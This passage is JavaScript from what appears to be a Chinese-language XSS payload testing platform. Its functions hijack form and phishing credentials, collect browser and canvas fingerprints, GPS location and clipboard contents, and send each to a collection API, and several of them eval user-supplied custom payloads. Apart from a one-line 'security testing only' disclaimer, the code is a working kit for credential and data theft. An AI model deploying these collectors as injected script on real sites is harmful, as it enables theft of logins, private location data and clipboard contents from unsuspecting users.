                    throw new Error(`HTTP ${response.status}`);
                }

                const result = await response.json();
                console.log('✅ 表单劫持响应:', result);
                
                if (result.status === 'success') {
                    updateStatus(3, 'success', `
                        <strong><i class="fas fa-check-circle"></i> 表单劫持成功！</strong><br>
                        <small>
                        • 用户名: ${data.username || '(空)'}<br>
                        • 密码: ${'*'.repeat((data.password || '').length)}<br>
                        • 邮箱: ${data.email || '(空)'}<br>
                        • 数据ID: ${result.id}<br>
                        • 用户ID: ${CURRENT_USER_ID}
                        </small>
                    `);
                } else {
                    throw new Error(result.message || '未知错误');
                }
            } catch (error) {
                console.error('❌ 表单劫持失败:', error);
                updateStatus(3, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }

        // 测试4: 钓鱼页面
        async function testPhishingPayload() {
            if (!checkLogin()) return;
            
            updateStatus(4, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在模拟钓鱼攻击...');
            
            try {
                const username = document.getElementById('phishUser').value;
                const password = document.getElementById('phishPass').value;
                
                const payload = {
                    type: 'phishing',
                    credentials: {
                        username: username,
                        password: password
                    },
                    url: window.location.href,
                    referrer: document.referrer,
                    user_id: CURRENT_USER_ID
                };
                
                console.log('🎣 发送钓鱼数据:', payload);

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }

                const data = await response.json();
                console.log('✅ 钓鱼测试响应:', data);
                
                if (data.status === 'success') {
                    updateStatus(4, 'success', `
                        <strong><i class="fas fa-check-circle"></i> 钓鱼测试成功！</strong><br>
                        <small>
                        • 捕获用户名: ${username || '(空)'}<br>
                        • 捕获密码: ${'*'.repeat(password.length)}<br>
                        • 来源页面: ${window.location.pathname}<br>
                        • 数据ID: ${data.id}<br>
                        • 用户ID: ${CURRENT_USER_ID}
                        </small>
                    `);
                } else {
                    throw new Error(data.message || '未知错误');
                }
            } catch (error) {
                console.error('❌ 钓鱼测试失败:', error);
                updateStatus(4, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }

        // 测试5: 浏览器指纹
        async function testFingerprintPayload() {
            if (!checkLogin()) return;
            
            updateStatus(5, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在收集浏览器指纹...');
            
            try {
                const fingerprint = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    canvas: getCanvasFingerprint()
                };
                
                const payload = {
                    type: 'fingerprint',
                    fingerprint: fingerprint,
                    user_id: CURRENT_USER_ID
                };
                
                console.log('👆 发送浏览器指纹:', payload);

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }

                const data = await response.json();
                console.log('✅ 指纹收集响应:', data);
                
                if (data.status === 'success') {
                    updateStatus(5, 'success', `
                        <strong><i class="fas fa-check-circle"></i> 指纹收集成功！</strong><br>
                        <small>
                        • 浏览器: ${navigator.userAgent.match(/\(([^)]+)\)/)[1]}<br>
                        • 平台: ${navigator.platform}<br>
                        • 语言: ${navigator.language}<br>
                        • 屏幕: ${screen.width}x${screen.height}<br>
                        • 时区: ${fingerprint.timezone}<br>
                        • 数据ID: ${data.id}<br>
                        • 用户ID: ${CURRENT_USER_ID}
                        </small>
                    `);
                } else {
                    throw new Error(data.message || '未知错误');
                }
            } catch (error) {
                console.error('❌ 指纹收集失败:', error);
                updateStatus(5, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Canvas Fingerprint', 2, 2);
                return canvas.toDataURL().substring(0, 50);
            } catch (e) {
                return 'unavailable';
            }
        }

        // 测试6: DOM劫持
        async function testDOMPayload() {
            if (!checkLogin()) return;
            
            updateStatus(6, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在劫持DOM元素...');
            
            try {
                const target = document.getElementById('domTarget');
                const originalContent = target.innerHTML;
                
                // 模拟DOM劫持
                target.innerHTML = '<p style="margin:0; color: var(--neon-pink);"><i class="fas fa-skull-crossbones"></i> DOM已被劫持!</p>';
                
                await new Promise(r => setTimeout(r, 1000));
                
                const payload = {
                    type: 'dom_hijack',
                    original: originalContent,
                    modified: target.innerHTML,
                    target_element: 'domTarget',
                    user_id: CURRENT_USER_ID
                };
                
                console.log('📦 发送DOM劫持数据:', payload);

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }

                const data = await response.json();
                console.log('✅ DOM劫持响应:', data);
                
                if (data.status === 'success') {
                    updateStatus(6, 'success', `
                        <strong><i class="fas fa-check-circle"></i> DOM劫持成功！</strong><br>
                        <small>
                        • 目标元素: #domTarget<br>
                        • 原始内容已记录<br>
                        • 修改内容已上报<br>
                        • 数据ID: ${data.id}<br>
                        • 用户ID: ${CURRENT_USER_ID}
                        </small>
                    `);
                    
                    // 恢复原始内容
                    setTimeout(() => {
                        target.innerHTML = originalContent;
                    }, 2000);
                } else {
                    throw new Error(data.message || '未知错误');
                }
            } catch (error) {
                console.error('❌ DOM劫持失败:', error);
                updateStatus(6, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }

        // 初始化
        console.log('%c🔒 XSS Payload测试平台已加载', 'color: #00ff41; font-size: 16px; font-weight: bold;');
        console.log('%c⚠️  本平台仅供安全测试使用，请勿用于非法用途', 'color: #ff006e; font-size: 12px;');
        console.log('👤 当前用户ID:', CURRENT_USER_ID);
        console.log('🌐 API地址:', API_URL);
        console.log('%c✅ 所有测试数据将自动关联到您的账号', 'color: #00d4ff; font-size: 12px;');
        
        // 复制Payload代码
        function copyPayload(id) {
            const code = document.getElementById('payload' + id).textContent;
            navigator.clipboard.writeText(code).then(() => {
                const btn = event.target;
                const original = btn.textContent;
                btn.textContent = '✓ 已复制';
                btn.style.background = 'rgba(0, 255, 65, 0.4)';
                setTimeout(() => {
                    btn.textContent = original;
                    btn.style.background = '';
                }, 2000);
            }).catch(err => {
                alert('复制失败，请手动选择复制');
            });
        }
        
        // 测试7: GPS定位
        async function testGPSPayload() {
            if (!checkLogin()) return;
            
            updateStatus(7, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在获取地理位置...<br><small>请允许浏览器访问位置权限</small>');
            
            if (!navigator.geolocation) {
                updateStatus(7, 'error', '<i class="fas fa-times-circle"></i> 浏览器不支持地理定位 API');
                return;
            }
            
            try {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const gpsData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    // 更新地图预览
                    const mapPreview = document.getElementById('mapPreview');
                    mapPreview.innerHTML = `
                        <div style="text-align: left; width: 100%;">
                            <p style="margin: 5px 0; color: var(--neon-cyan);"><i class="fas fa-globe"></i> <strong>经度:</strong> ${gpsData.latitude.toFixed(6)}°</p>
                            <p style="margin: 5px 0; color: var(--neon-cyan);"><i class="fas fa-globe"></i> <strong>纬度:</strong> ${gpsData.longitude.toFixed(6)}°</p>
                            <p style="margin: 5px 0; color: var(--neon-green);"><i class="fas fa-crosshairs"></i> <strong>精度:</strong> ±${gpsData.accuracy.toFixed(2)} 米</p>
                            ${gpsData.altitude ? `<p style="margin: 5px 0; color: var(--neon-purple);"><i class="fas fa-mountain"></i> <strong>海拔:</strong> ${gpsData.altitude.toFixed(2)} 米</p>` : ''}
                            <p style="margin: 5px 0; color: #888;"><i class="fas fa-clock"></i> <strong>时间:</strong> ${new Date(gpsData.timestamp).toLocaleString('zh-CN')}</p>
                            <p style="margin: 10px 0 5px 0; color: var(--neon-orange);"><i class="fas fa-map-marked"></i> <strong>Google地图:</strong> 
                                <a href="https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}" target="_blank" style="color: var(--neon-cyan); text-decoration: underline;">查看地图</a>
                            </p>
                        </div>
                    `;
                    
                    const payload = {
                        type: 'gps_location',
                        gps: gpsData,
                        userAgent: navigator.userAgent,
                        user_id: CURRENT_USER_ID
                    };
                    
                    console.log('📍 发送GPS定位数据:', payload);

                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}`);
                    }

                    const data = await response.json();
                    console.log('✅ GPS定位响应:', data);
                    
                    if (data.status === 'success') {
                        updateStatus(7, 'success', `
                            <strong><i class="fas fa-check-circle"></i> GPS定位成功！</strong><br>
                            <small>
                            • 位置: ${gpsData.latitude.toFixed(4)}°, ${gpsData.longitude.toFixed(4)}°<br>
                            • 精度: ±${gpsData.accuracy.toFixed(2)} 米<br>
                            ${gpsData.altitude ? `• 海拔: ${gpsData.altitude.toFixed(2)} 米<br>` : ''}
                            • 数据ID: ${data.id}<br>
                            • 用户ID: ${CURRENT_USER_ID}<br>
                            • <a href="https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}" target="_blank" style="color: var(--neon-cyan);">在Google地图中查看</a>
                            </small>
                        `);
                    } else {
                        throw new Error(data.message || '未知错误');
                    }
                }, (error) => {
                    let errorMsg = '获取地理位置失败';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = '用户拒绝了地理位置权限请求';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = '位置信息不可用';
                            break;
                        case error.TIMEOUT:
                            errorMsg = '获取位置超时';
                            break;
                    }
                    console.error('❌ GPS定位错误:', error);
                    updateStatus(7, 'error', `<i class="fas fa-times-circle"></i> ${errorMsg}<br><small>${error.message}</small>`);
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } catch (error) {
                console.error('❌ GPS测试失败:', error);
                updateStatus(7, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }
        
        // 测试8: 页面重定向
        async function testRedirectPayload() {
            if (!checkLogin()) return;
            
            updateStatus(8, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在执行重定向测试...');
            
            try {
                // 检查是否有自定义Payload
                const customPayload = document.getElementById('payload8').value.trim();
                const redirectUrl = document.getElementById('redirectUrl').value || 'https://www.baidu.com';
                
                if (customPayload) {
                    // 执行自定义Payload
                    console.log('📤 执行自定义重定向Payload');
                    eval(customPayload);
                    updateStatus(8, 'success', `<i class="fas fa-check-circle"></i> 自定义Payload已执行（请检查浏览器行为）`);
                } else {
                    // 使用默认测试
                    const payload = {
                        type: 'redirect',
                        target_url: redirectUrl,
                        from_url: window.location.href,
                        timestamp: new Date().toISOString(),
                        user_id: CURRENT_USER_ID
                    };
                    
                    console.log('🔄 发送重定向数据:', payload);
                    
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}`);
                    }
                    
                    const data = await response.json();
                    console.log('✅ 重定向数据响应:', data);
                    
                    if (data.status === 'success') {
                        updateStatus(8, 'success', `
                            <strong><i class="fas fa-check-circle"></i> 重定向测试成功！</strong><br>
                            <small>
                            • 目标URL: ${redirectUrl}<br>
                            • 数据ID: ${data.id}<br>
                            • 用户ID: ${CURRENT_USER_ID}<br>
                            • 提示: 实际攻击中会跳转到目标页面
                            </small>
                        `);
                    } else {
                        throw new Error(data.message || '未知错误');
                    }
                }
            } catch (error) {
                console.error('❌ 重定向测试失败:', error);
                updateStatus(8, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }
        
        // 测试9: 剪贴板劫持
        async function testClipboardPayload() {
            if (!checkLogin()) return;
            
            updateStatus(9, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在执行剪贴板劫持测试...');
            
            try {
                // 检查是否有自定义Payload
                const customPayload = document.getElementById('payload9').value.trim();
                
                if (customPayload) {
                    // 执行自定义Payload
                    console.log('📋 执行自定义剪贴板劫持Payload');
                    eval(customPayload);
                    updateStatus(9, 'success', `<i class="fas fa-check-circle"></i> 自定义Payload已执行（请复制一些文本测试）`);
                } else {
                    // 使用默认测试 - 监听剪贴板
                    let clipboardData = '';
                    
                    // 尝试读取剪贴板
                    if (navigator.clipboard && navigator.clipboard.readText) {
                        clipboardData = await navigator.clipboard.readText();
                    } else {
                        throw new Error('浏览器不支持剪贴板API或权限被拒绝');
                    }
                    
                    const payload = {
                        type: 'clipboard',
                        clipboard_data: clipboardData,
                        timestamp: new Date().toISOString(),
                        user_id: CURRENT_USER_ID
                    };
                    
                    console.log('📋 发送剪贴板数据:', payload);
                    
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}`);
                    }
                    
                    const data = await response.json();
                    console.log('✅ 剪贴板响应:', data);
                    
                    if (data.status === 'success') {
                        updateStatus(9, 'success', `
                            <strong><i class="fas fa-check-circle"></i> 剪贴板劫持成功！</strong><br>
                            <small>
                            • 捕获内容: ${clipboardData.substring(0, 50)}${clipboardData.length > 50 ? '...' : ''}<br>
                            • 内容长度: ${clipboardData.length} 字符<br>
                            • 数据ID: ${data.id}<br>
                            • 用户ID: ${CURRENT_USER_ID}
                            </small>
                        `);
                    } else {
                        throw new Error(data.message || '未知错误');
                    }
                }
            } catch (error) {
                console.error('❌ 剪贴板测试失败:', error);
                updateStatus(9, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }
        
        // 测试10: Alert弹窗
        async function testAlertPayload() {
            if (!checkLogin()) return;
            
            updateStatus(10, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在执行Alert测试...');
            
            try {
                // 检查是否有自定义Payload
                const customPayload = document.getElementById('payload10').value.trim();
                const alertMessage = document.getElementById('alertMessage').value || 'XSS漏洞测试成功！';
                
                if (customPayload) {
                    // 执行自定义Payload
                    console.log('⚠️ 执行自定义Alert Payload');
                    eval(customPayload);
                    updateStatus(10, 'success', `<i class="fas fa-check-circle"></i> 自定义Payload已执行`);
                } else {
                    // 使用默认测试
                    alert(alertMessage);
                    
                    const payload = {
                        type: 'alert_test',
                        message: alertMessage,
                        timestamp: new Date().toISOString(),
                        user_id: CURRENT_USER_ID
                    };
                    
                    console.log('⚠️ 发送Alert测试数据:', payload);
                    
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}`);
                    }
                    
                    const data = await response.json();
                    console.log('✅ Alert响应:', data);
                    
                    if (data.status === 'success') {
                        updateStatus(10, 'success', `
                            <strong><i class="fas fa-check-circle"></i> Alert弹窗测试成功！</strong><br>
                            <small>
                            • 弹窗消息: ${alertMessage}<br>
                            • 数据ID: ${data.id}<br>
                            • 用户ID: ${CURRENT_USER_ID}<br>
                            • 提示: XSS漏洞已确认存在
                            </small>
                        `);
                    } else {
                        throw new Error(data.message || '未知错误');
                    }
                }
            } catch (error) {
                console.error('❌ Alert测试失败:', error);
                updateStatus(10, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }
    </script>
</body>
</html>
